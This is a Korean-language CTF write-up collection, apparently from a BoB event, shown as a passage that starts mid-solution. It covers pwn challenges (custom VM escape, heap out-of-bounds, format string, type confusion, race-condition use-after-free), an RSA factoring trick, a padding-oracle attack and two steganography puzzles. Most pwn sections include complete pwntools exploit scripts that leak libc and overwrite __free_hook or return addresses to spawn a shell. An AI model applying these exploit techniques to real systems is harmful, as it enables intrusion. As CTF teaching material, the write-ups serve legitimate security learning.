COMP cx, 20x
MOVE ax, cx
ADD cx, 1
JNE LABEL_3
RETURN

.LEAK_WORD_4
MOVE cx, 0
:LABEL_4
COMP cx, 21x
MOVE ax, cx
ADD cx, 1
JNE LABEL_4
RETURN

.MAIN
// leak libc
CALL LEAK_WORD_1
MOVE bx, SECTION#LEAK_DATA
ADD bx, 0
MOVE [bx], ax

CALL LEAK_WORD_2
MOVE bx, SECTION#LEAK_DATA
ADD bx, 2
MOVE [bx], ax

CALL LEAK_WORD_3
MOVE bx, SECTION#LEAK_DATA
ADD bx, 4
MOVE [bx], ax

CALL LEAK_WORD_4
MOVE bx, SECTION#LEAK_DATA
ADD bx, 6
MOVE [bx], ax

// leak
MOVE cx, 8
MOVE bx, SECTION#LEAK_DATA
MOVE ax, 1
SYSCALL

// write SECTION#LEAK_DATA
MOVE ax, 0
SYSCALL

// overwrite
MOVE bx, 0
MOVE ax, SECTION#LEAK_DATA
MOVE dx, [ax]
LSHIFT 18x, dx, bx

ADD ax, 2
MOVE dx, [ax]
LSHIFT 19x, dx, bx

ADD ax, 2
MOVE dx, [ax]
LSHIFT 20x, dx, bx

ADD ax, 2
MOVE dx, [ax]
LSHIFT 21x, dx, bx
RETURN
```

pwn.asm에서 표현된 18x, 19x 등의 레지스터는 원래는 존재하지 않는 레지스터로, return address를 가리키도록 조작된 opcode이다.

**exploit poc**

```python
#!/usr/bin/env python3
from pwn import *
import hashlib, secrets, re

r = remote("localhost", 12001)
p = r.recvline().strip().decode()
k, v = re.findall(r'\"[^)]*\"', p)
k, v = k[1:-1], v[1:-1]
log.info("parsed (k, v) = ({}, {})".format(k, v))

pg = log.progress("PoW")
pg.status("solving ...")

while True:
    x = secrets.token_hex(5)
    if hashlib.sha256((k + x).encode()).hexdigest()[:5] == v:
        pg.success("solved [x = {}]".format(x))
        break

payload = "QlZNAAYSABoALAA+AFAAYgAFAAAAAAAAAAABAgAAGQISEQACAgIBAAweAA4BAgAAGQITEQACAgIBAAwwAA4BAgAAGQIUEQACAgIBAAxCAA4BAgAAGQIVEQACAgIBAAxUAA4NGgBBAQACAQAAMQEADSwAQQEAAgECADEBAA0+AEEBAAIBBAAxAQANUABBAQACAQYAMQEAAQIIAEEBAAEAAQAPAQAAAA8BAQAAQQAAIQMABxIDAQIAAgAhAwAHEwMBAgACACEDAAcUAwECAAIAIQMABxUDAQ4="
# payload = b64e(open("pwn.bvm", "rb").read()
r.sendlineafter("x = ", x)
r.sendlineafter("> ", payload)

r.recvuntil("loading ...\n")
libc = u64(r.recvn(8)) - 0x021b97 # libc_base
r.info("libc: {:x}".format(libc))
r.send(p64(libc + 0x4f365)) # oneshot
r.interactive()

# cat flag
# bob{B0undary_cheCK_1s_e2sy_T0_f0rg2t}
```


<br />


<br />


## cluster_shell

---

![/assets/bob/bob966.png](/assets/bob/bob966.png)
```
libc 2.31 heap oob문제
```
- vim처럼 만든 메모장 기능과 유사 쉘 프롬프트

```bash
sh# help
========================================
help    - Help
ls      - List of files
cat     - Print the contents
rm      - Remove file
vim     - Text editor
========================================
sh# ls
 - 1
sh# cat 1

 aaaa

sh# vim 1
##################
#_aaaa...........#
#................#
#................#
#................#
#................#
#................#
#................#
#................#
#................#
#................#
#................#
#................#
#................#
#................#
#................#
#................#
##################
```

- vim으로 파일을 하나 만들때 마다 힙에 0x110크기의 청크를 할당한다. **rm**으로 삭제할때 마다 free로 청크 해제 가능. 딱 봐도 메모리에 뭔가 쓰거나 할 수 있는게 **vim**기능밖에 없기 때문에 vim코드로 간다.
- sub_1980가 **vim**코드이고, 안의 분기에 sub_14E2가 **vim**모드에서 커서를 움직이는 코드. switch문으로 jmp로 해당 루틴으로 들어간다. sub_149E가 oob방지를 위한 boundary check함수

![/assets/bob/bob967.png](/assets/bob/bob967.png)

- qword_5058이 vim모드에서 커서의 위치이다. 커서의 위치가 움직이는 코드에는 모두 위 boundary check함수가 있어야 한다.

![/assets/bob/bob968.png](/assets/bob/bob968.png)

- 하지만 같은 영역내에 boundary check함수 없이 커서의 위치를 조작하는 기능이 있다. 이를 이용해 vim note내에서 oob취약점을 트리거 하여 힙 영역내에 청크를 조작할 수 있다.
- switch문을 분석하면 jmp코드를 어디로 탈지 테이블이 있다.

```bash
0x800153c:   lea    0x1ac5(%rip),%rdx        # 0x8003008
=> 0x8001543:   add    %rdx,%rax
   0x8001546:   notrack jmpq *%rax
```

- `0x8003008` + [테이블 데이터]로 점프를 타는데 점프를 탈 곳을 위에서 찾은 취약한 함수가 있는곳을 찾는다. 찾는 값은 0x8003008 + X = 0x8001608이므로

```bash
>>> hex(0x8001608-0x8003008&0xffffffff)
'0xffffe600'
```

- 해당 값은 0x8003008[0x27]번째에 있다.

```bash
(gdb) x/128wx 0x8003008
0x8003008:      0xffffe640      0xffffe64e      0xffffe64e      0xffffe64e
0x8003018:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003028:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003038:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003048:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003058:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003068:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003078:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003088:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003098:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe600
0x80030a8:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x80030b8:      0xffffe64e      0xffffe64e      0xffffe541      0xffffe5f2
0x80030c8:      0xffffe56f      0xffffe59d      0xffffe5cb      0xffffe64e
0x80030d8:      0xffffe64e      0xffffe620      0x6f4e0020      0x6c696620
(gdb) x/wx 0x8003008+0x27*4
0x80030a4:      0xffffe600
```

```bash
.text:0000000000001513                 movzx   eax, byte ptr [rbp-9]
.text:0000000000001517                 movsx   eax, al
.text:000000000000151A                 sub     eax, 3Ah ; ':'
.text:000000000000151D                 cmp     eax, 35h ; '5'
.text:0000000000001520                 ja      loc_1656
.text:0000000000001526                 mov     eax, eax
```

- switch계산에서 [사용자의 입력] - 0x3a를 하니 더하면 문자 `a`가 된다.

```bash
>>> chr(0x27+0x3a)
'a'
```

- vim모드에서 a문자를 입력할 시 다음과 같은 코드의 실행을 알게 된다.

```c
mov     rax, cs:qword_5058
add     rax, 1
mov     cs:qword_5058, rax
mov     eax, 0ABCD0001h
mov     cs:qword_5010, rax
jmp     short loc_1663
```

- 이 뒤부터는 oob를 이용해 코드를 볼 필요 없이 메모리만 보면서 취약점의 트리거가 가능하다.
- 다양한 방법으로 취약점을 트리거 할 수 있지만 나는 tcache bin attack으로 `__free_hook`에 `system`을 덮어서 트리거하였다.

```c
alloc(0)
alloc(1)
alloc(2)
alloc(3)
alloc(4)
alloc(5)

oob(0, p64(0x0) + p64(0x481))
free(1)
alloc(1)
```

- heap chunk 6개 할당하고 1번 힙의 크기를 0x480으로 바꿔 unsorted bin으로 바꾸고 해제하여 libc의 주소를 바로 구할 수 있다. `oob`는 0번째 힙 청크의 바로 뒤에 적기 시작하는 함수이다.

```c
free(4)
free(3)

payload = p64(0x0) + p64(0x121)
payload += b"A" * 0x110
payload += p64(0x0) + p64(0x361)
payload += p64(leak)
payload += p64(leak)
payload += b"A" * (0x110-0x10)
payload += p64(0x0) + p64(0x121)
payload += p64(libc + e.symbols['__free_hook']-0x10)
oob(0, payload)
```

- 4번 3번 청크를 해제해 tcache bin을 만들고 위에서 leak한 libc의 주소를 가져와 oob취약점으로 tcache bin의 다음 할당될 공간을 바꾼다. tcache bin은 사이즈 체크같은 귀찮은게 없어서 편하다.

```c
alloc('AA')
p.sendlineafter("sh# ", f"vim /bin/sh")
p.recvuntil("#" * 0x10)
p.sendline(b"i" + p64(libc + e.symbols['system']))
p.recvuntil("#" * 0x10)
p.sendline(":q")
free('/bin/sh')
```

- `__free_hook`을 `system`으로 덮고 호출.

### exploit

```python
#!/usr/bin/env python3

'''
cluster_shell

in honestly, this is not has a relationship the clustering.

nc pwn.wwwlk.kr 13337

libc: http://pwn.wwwlk.kr/libc.so.6
md5: 10fdeb77eea525914332769e9cd912ae

binary: http://pwn.wwwlk.kr/cluster_shell
md5: a5960d98860dc3d5bf82ba82b0fe6dca
'''

from pwn import *

# context.log_level = 'debug'

def alloc(n):
   p.sendlineafter("sh# ", f"vim {n}")
   p.recvuntil("#" * 0x10)
   p.recvuntil("#" * 0x10)
   p.sendline(":q")

def free(n):
   p.sendlineafter("sh# ", f"rm {n}")

def oob(n, value):
   p.sendlineafter("sh# ", f"vim {n}")
   p.sendline(b"j" * 0xf + b"l" * 0xf + b'a' + value)
   p.sendline(":q")

gdbscript = '''
codebase
c
'''

p = process("./a.out")
e = ELF("./libc.so.6")

alloc(0)
alloc(1)
alloc(2)
alloc(3)
alloc(4)
alloc(5)

oob(0, p64(0x0) + p64(0x481))
free(1)
alloc(1)

p.sendlineafter("sh# ", "ls")
p.recvuntil(" - ")
p.recvuntil(" - ")
p.recvuntil(" - ")
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc = leak - 0x1ebbe0
log.info(f"leak: 0x{leak:x}")

free(4)
free(3)

payload = p64(0x0) + p64(0x121)
payload += b"A" * 0x110
payload += p64(0x0) + p64(0x361)
payload += p64(leak)
payload += p64(leak)
payload += b"A" * (0x110-0x10)
payload += p64(0x0) + p64(0x121)
payload += p64(libc + e.symbols['__free_hook']-0x10)
oob(0, payload)

alloc('AA')
p.sendlineafter("sh# ", f"vim /bin/sh")
p.recvuntil("#" * 0x10)
p.sendline(b"i" + p64(libc + e.symbols['system']))
p.recvuntil("#" * 0x10)
p.sendline(":q")
free('/bin/sh')

p.interactive()
```


<br />


<br />



## Porn Master

---

![/assets/bob/bob969.png](/assets/bob/bob969.png)

Format String Bug를 이용한 stack 영역 변조 및 쉘 획득 (glibc 2.27)

- 보호기법

```bash
Canary                        : ✓
NX                            : ✓
PIE                           : ✓
Fortify                       : ✘
RelRO                         : Full
```

- 실행결과

![/assets/bob/bob970.png](/assets/bob/bob970.png)

- 코드확인
- 사용자에게 name 을 0x64 사이즈만큼 입력을 받으며 힙 영역에 저장을 한다.
- 또한, 사용자에게 0x18 사이즈만큼 입력을 받아 스택에 저장하며, 입력과 출력을 각 2번씩 수행하는 것을 확인할 수 있다. 해당영역에서 `FSB` 취약점이 발생하는 것을 확인할 수 있다.

![/assets/bob/bob971.png](/assets/bob/bob971.png)

- 취약점이 발생하는 `printf` 에 브레이크포인트 지정 후 디버거 확인
- 디버거를 통해 스택을 확인할 시 `0x00007ffd8e961198` 주소가 `0x00007ffd8e96118c` (변수 i)를 가리키는 포인터 변수(idx)인 것을 확인할 수 있다. 즉, 해당영역을 FSB를 통해 변조할 시 무제한으로 입출력 할 수 있다.
- 따라서, stack 및 libc leak 이후 ret 를 oneshot 으로 변조하여 exploit 할 수 있다.

![/assets/bob/bob972.png](/assets/bob/bob972.png)

- exploit code

```python
from pwn import *

bi = './pwn'
r = process([bi])
#r = remote('localhost', 12002)

def reset():
    pay = '%11$n'
    r.sendlineafter('> ', pay )

r.sendlineafter(': ', 'gpsfly')

pay = '%17$p'
r.sendlineafter('> ', pay )
libc = int(r.recvline().strip(), 16) - 0x21b97
log.info("libc @ {}".format(hex(libc)))
reset()

pay = '%11$p'
r.sendlineafter('> ', pay)
stack = int(r.recvline().strip(), 16) - 0xc + 0x48
log.info("stack @ {}".format(hex(stack)))
reset()

oneshot = libc+0x4f2c5
oneshot = p64(oneshot)[:6]

for i in range(6):
    pay = '%{}c%14$hhn'.format(ord(oneshot[i]))
    pay = pay.ljust(0x10,'A')
    pay += p64(stack+i)[:6]
    r.sendlineafter('> ', pay)
    reset()

r.sendlineafter('> ','')
r.sendlineafter('> ','')

r.interactive()
```


<br />


<br />



## Housepital

---

![/assets/bob/bob973.png](/assets/bob/bob973.png)

- 보호기법

```bash
Canary                        : ✓
NX                            : ✓
PIE                           : ✓
Fortify                       : ✘
RelRO                         : Full
```

- 실행결과
- 해당 바이너리는 `add`, `view`, `delete` 3가지 기능이 있으며 힙 영역에 메모리를 할당하여 쓰고, 읽고, 해제할 수 있다.

![/assets/bob/bob974.png](/assets/bob/bob974.png)

- 구조체 확인

```python
struct Patient
{
    char name[0x24]; # 24 bytes
    unsigned int age; # 4 bytes
    size_t gender; # 8 bytes
    char *sickness; # 8 bytes
};
```

- 취약점 확인 (add function)
- 25 line 에 scanf 함수 호출 시 `%lld` 포맷은 8 바이트 입력을 받으며, patient_list[i]→age 변수는 unsigned int (4 바이트)형 변수 이므로 해당 코드에서 `Type Confusion` 이 발생한다.
- 이를 통해 아래 26 line 및 47 line 을 통해 0x40 chunk 를 할당받아 0x80 사이즈 만큼 입력을 받는 등 `Heap Overflow`로 악용 가능하다.

![/assets/bob/bob975.png](/assets/bob/bob975.png)

- exploit plan
    1. libc leak

        1.1. 0x420 이상의 청크를 만든 뒤 free 하여 `unsorted bin` (libc-main_arena) 생성

        1.2. view 메뉴를 통해 libc 주소 leak

    2. rip 변조

        2.1. tcache bin 의 fd 를 `__malloc_hook` 또는 `__free_hook` 주소로 변조

        2.2. tcache chunk 할당 시 `oneshot` 또는 `system` 주소로 변조

        2.3. malloc 또는 free 함수를 호출하여 트리거

        - __free_hook 을 system 주소로 변조 하였을 경우 힙 메모리에 `"/bin/sh"` 문자열 저장 후 호출
- exploit code

```python
from pwn import *

bi = './pwn'
r = process([bi])
#r = remote('localhost', 12003)
e = ELF(bi)
l = ELF('libc.so.6')
xla = lambda x : r.sendlineafter(': ', str(x))
xa = lambda x : r.sendafter(': ', str(x))
add = lambda name,gender,age,sickness : [xla('1'), xa(name), xla(gender), xla(age), xa(sickness)]
view = lambda idx : [xla('2'), xla(idx)]
dele = lambda idx : [xla('3'), xla(idx)]

[add('Z', 0, 0xff, 'A') for _ in range(2)]

add('Z', 0, 0xff, 'A')
[add('A', 1, 0xff, 'A') for _ in range(5)]
add('A'*8+p64(0x31), 1, 0xff, 'A')
dele(2)
pay = 'A'*0x40
pay += p64(0) + p64(0x421)
add('Z', 0, 0x1000000ff, pay)
dele(3)
dele(2)
pay = 'A'*0x50
add('Z', 0, 0x1000000ff, pay)
view(2)
r.recvuntil('sickness : {}'.format('A'*0x50))
libc = u64(r.recvline().strip().ljust(8,'\x00')) - l.sym['__malloc_hook'] - 0x70
log.info("libc @ {}".format(hex(libc)))

dele(2)
dele(4)
dele(5)
dele(6)

dele(1)
dele(0)
pay = 'A'*0x40
pay += p64(0) + p64(0x41)
pay += p64(libc+l.sym['__free_hook'])
add('Z', 0, 0x1000000ff, pay)

[add(p64(libc+l.sym['system']), 0, 0xff, '/bin/sh') for _ in range(2)]
dele(1)

r.interactive()
```

- 추가적으로, 개발 실수로 인해 add 함수에 힙 메모리 할당 시 해당 영역으로 초기화(memset 또는 calloc) 하지 않아 `Uninitialized Heap` 버그가 존재하니 해당 버그를 이용하여 exploit 해보는것도 추천한다.


<br />


<br />



## Corona

---

![/assets/bob/bob976.png](/assets/bob/bob976.png)

race condition을 이용한 thread heap exploit challenge.

### Challenge

사용할 수 있는 메뉴는 아래와 같다.

1. Create house : house structure 할당
2. Edit house : house name 수정
3. Add person : person structure 할당
4. Check status : person 상태 출력 
5. hidden : person name 수정 (한번만 호출 가능)

또한 프로그램에는 두개의 thread가 동작하고 있다.

1. t_virus : 랜덤(3 + rand()%8)으로 사람을 한명 감염시키고 person chunk를 free 한다.
2. t_day_check : 5초에 한번씩 하루가 지나며 하루가 지날 때 마다 감염된 person 객체를 null로 덮어쓴다. 

### Vulnerability

취약점은 race condition으로, t_virus 쓰레드가 person chunk를 free한 후 t_day_check 쓰레드가 person list를 free하기 전에 free된 person 에 접근하면 Use-After-Free 취약점이 발생한다.

### Exploit

exploit에 앞서 이 문제를 최대한 빠르게 exploit하기 위해 알고있어야하는 두가지가 있다.

1. 바이너리에서 chunk를 free하는게 자유롭지 않다. t_virus thread가 랜덤으로 free하는데, list에 chunk가 없을 경우 free되지 않을 수도 있다. 따라서 chunk를 최대한 높은 확률로 free시키기 위해서는 모든 house에 person을 전부 채우고 free 될 때 출력되는 메세지로 어떤 청크가 free된건지 구분하는게 좋다 (`printf("\n%s was infected ...\n", house_list[rd]->list[i]->name);`)
그래서 exploit을 작성할 때도 특수한 chunk가 free되는걸 가정하기 보다, 단순히 chunk가 free되는 사실을 이용해 코드를 작성해야 한다. 그렇지 않으면 랜덤 때문에 디버깅이 매우 힘들고 exploit을 완성하는데 오랜 시간이 걸릴 것이다.
2. race를 내는 시간이 너무 길다. t_day_check가 5초이고 t_virus가 (rand()%8 + 3)초인데 사실상 chunk 하나가 free되기 위해서는 최소 3초를 기다려야한다는 말이 된다. 문제를 풀 때는 바이너리 패치로 이 값을 짧게 줄여서 exploit해야 디버깅하는데 시간을 최소화할 수 있다.

아마 위 두가지를 안했다면 디버깅이 매우 불편했을 것이다. 다음은 실제로 exploit하는 순서이다.

1. 5일째에 libc leak을 제공해 준다.
2. t_virus로 8개의 chunk를 free한다. (7개의 chunk는 tcache에 저장되며 마지막 chunk는 fastbin에 저장된다.)
3. hidden 메뉴를 이용해 fastbin chunk의 fd를 free hook - 0x10으로 돌린다. (race condition 트리거)
4. 동일한 사이즈의 청크를 하나 더 할당하면 fastbin chunk를 tcache bin 으로 옮긴다. 
5. tcache bin에 있는 chunk를 할당받아 free_hook에 원하는 값을 쓴다.
6. person name에 /bin/sh를 넣어 t_virus가 chunk를 free할 때 shell을 획득한다. 

### Note

사실 이 문제를 처음 기획했을때 핵심적인 내용은 libc 주소를 leak하는 부분이었다. 다만 libc를 leak하는 방법이 생각보다 너무 어려워져서 이것과 함께 tcache bin trick을 같이 낸다면 푸는데 너무 많은 시간이 걸릴것이라 판단했다. 그래서 libc 주소를 주는 방향으로 문제를 변경했고, exploit에서 안쓰는 edit house 메뉴가 있는 이유도 leak을 주는걸로 패치해서 그렇다. (하지만 지금 문제에서도 libc leak을 할 수 있으니 도전해보고 싶으신 분들은 도전해 보시길..)

그리고 exploit의 핵심적인 내용 중에 tcache 관련 트릭이 있는데, 사실 이것은 공개적으로 알려지거나 흔히 사용되는 트릭은 아닌 만큼 fastbin bin에 있는 chunk가 tcache으로 옮겨진다는 사실을 모르는 분들이 많을 것이라 생각했다. 특히 CTF에서 heap 관련 문제는 모르는 트릭이 나와 고생하는 경우가 많은데, 이 문제에서는 트릭을 몰라도 자연스럽게 문제를 풀 수 있도록 최대한 유도했다.

그 부분이 바로 Person chunk를 0x70 사이즈의 chunk로 줬다는 사실인데, exploit에서 tcache bin 트릭을 사용하면 사이즈와는 상관 없이 원하는 주소를 덮어 쓸 수 있다. 하지만 이 사실을 모르는 분들은 이미 흔하게 알려진 0x70 fastbin chunk의 fd를 덮어 __malloc_hook을 덮어쓰는 exploit을 생각했을 것이다. 만약 이런 생각을 통해 exploit을 작성했다 하더라도 __malloc_hook을 덮어쓰는 과정에서 자연스럽게 fastbin chunk가 tcache bin으로 옮겨지는 사실을 확인할 수 있을 것이다. 여기서 좀만 더 디버깅을 하다 보면 exploit을 완성할 수 있도록 문제를 설계했다. 그래서 이 문제를 푸는 모든 분들이 모르면 못푸는 트릭문제라고 생각하지 않았으면 좋겠다는 마음으로 최대한 익스 유도를 해봤다.

### Exploit Code

실수로 문제 코드와 exploit을 다 날려버린 바람에,, 문제를 크로스 체킹 해주신 핵심연구팀 김동민님(@gpsfly) 익스를 첨부한다.

```python
from pwn import *
import sys

bi = './bin.elf'
#r = process([bi])
r = remote('bob.lordofpwn.kr', 31337)
context.terminal = ['tmux', 'new-window']
sla = r.sendlineafter
sa = r.sendafter
p = pause
dbg = gdb.attach
e = ELF(bi)
l = ELF('libc') # remote
#l = ELF('libc.so.6') # local

sc = '''
heap-analysis-helper
c
'''
if len(sys.argv) > 1:
    dbg(r, sc)

xla = lambda x : sla('>> ', str(x))
xa = lambda x : sa('>> ', str(x))
create = lambda name : [xla(1), xa(name)]
edit = lambda idx,name : [xla(2), xla(idx), xa(name)]
add = lambda idx,name,age,height : [xla(3), xla(idx), xa(name), xla(age), xla(height)]
check = lambda idx : [xla(4), xla(idx)]
hidden = lambda hidx,pidx,name : [xla(31337), xla(hidx), xla(pidx), xa(name)]

for i in range(7):
    create('/bin/sh')
    for j in range(8):
        add(i, '{}_{};/bin/sh'.format(i,j), 1, 1)

cnt = 0
while True:
    data = r.recvline().strip()
    if 'The gift' in data:
        libc = int(data.split(' : ')[1], 16) - l.sym['printf']
        log.info("libc @ {}".format(hex(libc)))
    elif 'infected' in data:
        cnt += 1
        print(cnt, data)
        if cnt == 8:
            i, j = data.split(' was ')[0].split(';')[0].split('_')
            r.sendline('5')
            hidden(i, j, p64(libc+l.sym['__free_hook']-0x10)) #free_hook-0x10
            create('A'*0x60)
            add(i, p64(libc+l.sym['system']), 1, 1) #system
            edit(0, 'X')
            break

r.interactive()
```


<br />


<br />



# 🖥️ CRYPTO

## Easy RSA

---

![/assets/bob/bob977.png](/assets/bob/bob977.png)

Easy polynomial factoring

- 문제에서는 공개키만 제공된다. 즉 이 문제에서는 N을 factorization하는 게 목표이다.
- code에서 N의 값을 13진법으로 살펴보라는 힌트가 주어졌다.
- N을 base 13으로 살펴보면 아래와 같다.

`1100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013a41000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000019bba2`

- 이를 다항식으로 나타내면 아래와 같다.

`x^400 + x^399 + x^203 + 3*x^202 + 10*x^201 + 4*x^200 + x^199 + x^5 + 9*x^4 + 11*x^3 + 11*x^2 + 10*x + 2 (x=13)`

- sage에서 해당 다항식을 `poly.factor()`로 factorization하면 p와 q를 구할 수 있다.

**Exploit Code**

```python
sage: N = 4069355261174518447044221465092549731956949577068389562886621536859114995157407396913103746675307806861475505196604075690189887011157213
....: 06579441204391802579988679325559464933524679569288946633797366876605906618330862289486089133036525973648043594211930902803789362401571187621
....: 75215559436614871795165204002781471609204034064252028413035000407848466271441883438192490960762478416146403426890827177153457241880068131862
....: 173969477923674349247844851493
sage: 
sage: N.str(base=13)
'1100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013a41000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000019bba2'
sage: poly = sum(e * x^i for i,e in enumerate(N.digits(13)))
sage: 
sage: poly
x^400 + x^399 + x^203 + 3*x^202 + 10*x^201 + 4*x^200 + x^199 + x^5 + 9*x^4 + 11*x^3 + 11*x^2 + 10*x + 2
sage: poly.factor()
  ***   Warning: increasing stack size to 2000000.
(x^200 + x^199 + x^2 + 8*x + 2)*(x^200 + x^3 + x^2 + x + 1)
sage: p = 13^200 + 13^199 + 13^2 + 8*13 + 2
sage: q = 13^200 + 13^3 + 13^2 + 13 + 1
```


<br />


<br />



## Boom Boom

---

![/assets/bob/bob978.png](/assets/bob/bob978.png)

Oracle Padding Attack

![/assets/bob/bob979.png](/assets/bob/bob979.png)

**문제확인**

> 테러단체에서 폭탄테러가 있을 예정이라는 첩보를 입수했다....(생략)... 암호문을 복호화하고 암호 해제 비밀번호를 획득해라!

- 문제에 접속하면 메시지와 함께 IV와 Ciphertext를 확인할 수 있다.
- 페이지에 새로 접속할 때마다 새로운 IV와 Ciphertext를 출력해준다.

**기능확인**

![/assets/bob/bob980.png](/assets/bob/bob980.png)

- `Module` 페이지에서는 `IV`와 `Ciphertext`를 입력할 수 있다.

![/assets/bob/bob981.png](/assets/bob/bob981.png)

- `Flag` 페이지에서는 `Passcode`를 입력할 수 있다. 올바른 `Passcode`를 입력하면 `FlAG`를 출력한다.

**분석**

- Module 페이지에서는 총 3가지의 응답이 존재한다.

![/assets/bob/bob982.png](/assets/bob/bob982.png)

**1) Invalid padding**

- IV가 알맞지 않을 경우 발생(Padding error)

![/assets/bob/bob983.png](/assets/bob/bob983.png)

![/assets/bob/bob984.png](/assets/bob/bob984.png)

**2) incoreect!**

- Padding은 알맞게 채워진 경우

![/assets/bob/bob985.png](/assets/bob/bob985.png)

**3) correct!**

- IV와 Ciphertext 모두 알맞을 경우 발생

**Oracle Padding Attack 개념**

- 취약점 설명
    - 블록암호에서 사용되는 패딩이, 올바른지 올바르지 않은지에 따라 서버의 응답이 달라질 경우 이를 통해 공격을 수행 할 수 있다.

- 패딩이란?
    - 블록 암호화해서 사용하는 것으로, 일정 단위로 블록을 자를때 마지막 블록에 앞 블록과 같은 길이로 만들어주기 위해 남는 곳은 패딩으로 채운다.

    ![/assets/bob/bob986.png](/assets/bob/bob986.png)

    - 오라클 패딩의 경우, 5byte가 남았으면 0x05로 5byte를 채우고 2byte가 남았으면 0x02로 2byte를 채운다.
    - 만약 평문이 8byte일 경우 다음 블록을 모두 0x08로 8byte 채운다.

![/assets/bob/bob987.png](/assets/bob/bob987.png)

- 암호화를 수행하는 과정은 위 그림과 같다.
- iv와 plain text를 xor 하여 Intermediary Value를 얻고 그 값을 3DES 암호화 방식을 거쳐 암호문으로 나온다.
- 이후 그 암호문을 iv로 사용한다.
- 즉 암호문은, IV+암호블럭1+암호블럭2로 이뤄진다.

![/assets/bob/bob988.png](/assets/bob/bob988.png)

- 복호화 과정을 살펴보면 위 그림과 같다. 암호문을 3DES로 복호화 하여 Intermediary Value 값을 얻는다.
- 이후 IV와 Intermediary Value를 XOR 하여 plain 값을 얻는다.

![/assets/bob/bob989.png](/assets/bob/bob989.png)

- IV와 Intermediary Value 값을 XOR 한 plain 블럭의 마지막 값(패딩 부분)이 0x01이 되는 IV 마지막 값 찾고, 0x01과 그 IV 마지막 값을 XOR 하면 Intermediary의 마지막 값을 알 수 있다.
- 동일한 방식으로 0x01 부터 0x08까지 패딩을 가정하여 IV 값을 변경하며 서버로 요청을 수행하고, invalid 응답을 경우의 값을 iv로 두고 그때의 패딩 값과 xor 하여 intermediary value 값을 얻을 수 있고 intermediary value 값과 이미 알고있는 iv 값을 xor 하여 plain 값을 얻을 수 있다.

**FlAG 획득!**

Exploit code

```python
import base64
from urllib.parse import quote, unquote
import binascii
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
from collections import OrderedDict
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# paload send
def send_payload(s, payload_iv, payload_ciphertext):
    # variable initialization
	url = ""
	headers = {}
	params = {}
	data = {}

    # URL setting
	url = 'http://1-star.kr/onestar/padding/module.php'

    # params setting
	params = {'iv': base64.b64encode(payload_iv), 'ciphertext': base64.b64encode(payload_ciphertext)}

    # data setting
	data = OrderedDict()

    # send packet
	r = s.get(url, params=params, verify=False)
	return r.text

def xor(data, key):
	output = bytearray()
	for i, ch in enumerate(data):
		output.append(ch ^ key[i % len(key)])
	return bytes(output)

# hex
def hex_view(data):
	temp = data.hex()
	ret = ""
	for i in range(0, len(temp), 2):
		ret += temp[i:i+2] + " "
	return ret

iv=base64.b64decode(unquote("QjA2bGwxVTM%3D"))
enc=base64.b64decode(unquote("EJA3gltQjV4%3D"))
inter=b''
s = requests.Session()

print("I V => {}".format(hex_view(iv)))
print("ENC => {}".format(hex_view(enc)))

#make iv 1~len(iv)+1 
for i in range(1,len(iv)+1):
	print ("===========================================")
	print ("i: ",i)
	start = iv[:len(iv)-i]
	print ("start: ", hex_view(start))
	print ("bytes([i]): ", bytes([i]))
	for j in range(0,0xff+1):
		print ("j: ",j)
		target = start + bytes([j]) + xor(inter[::-1], bytes([i]))
		res = send_payload(s, target, enc)
		print("target: ", hex_view(target), "=>", target)
		#print(hex_view(enc), "=>", enc)
		#print(res)
		if 'Invalid padding.' not in res:
			print(res)
			break
	inter += bytes([i ^ j])
	print("inter: ", hex_view(inter[::-1]))
	print("inter: ", hex_view(inter[::-1]))

# inter xor iv => plain
inter = inter[::-1]
plain = xor(inter, iv)
print("plain =>", plain)
```

![/assets/bob/bob990.png](/assets/bob/bob990.png)

![/assets/bob/bob991.png](/assets/bob/bob991.png)


<br />


<br />



# 🖥️ MISC

## 'gif't

---

문제에 대한 간단 설명

![/assets/bob/bob992.png](/assets/bob/bob992.png)

easy gif misc

- 문제의 그림에서 gif 그림을 보면 반짝이는 글자가 두 위치에서 반짝이는 것을 볼 수 있다. 이 그림이 문제 파일이다.

![/assets/bob/bob993.png](/assets/bob/bob993.png)

- 이 gif 파일을 보면 16진수로 두 개의 글자가 왔다갔다 하는 것을 볼 수 있다.
- 풀이하는 방법은 다양하게 있을 수 있기 때문에 하나하나 설명하지 않고, 파일 내부의 gif 구성을 보여주도록 하겠다.

![/assets/bob/bob994.png](/assets/bob/bob994.png)

- 위와 같이 이미지를 볼 수 있는데, 이를 쭈욱 따라 작성하여 16진수를 ascii로 변환하게 되면 flag를 얻을 수 있는 간단한 문제다.


<br />


<br />



## Hide And Seek

---

![/assets/bob/bob995.png](/assets/bob/bob995.png)

이 문제에서는 stego.png 파일이 주어진다. 주어진 파일의 이름에 나타나듯 Stegography 문제의 일종으로 파악할 수 있다.
문제의 이미지를 잘 보면 아래 검은색 영역에 초록색 점들이 일부 나타나는 것을 확인할 수 있다. 이 문제는 이미지의 PIXEL을 구성하는 구분 값 R,G,B,A 중 A 값(투명도)을 활용하여 Flag를 추출하는 문제다. 

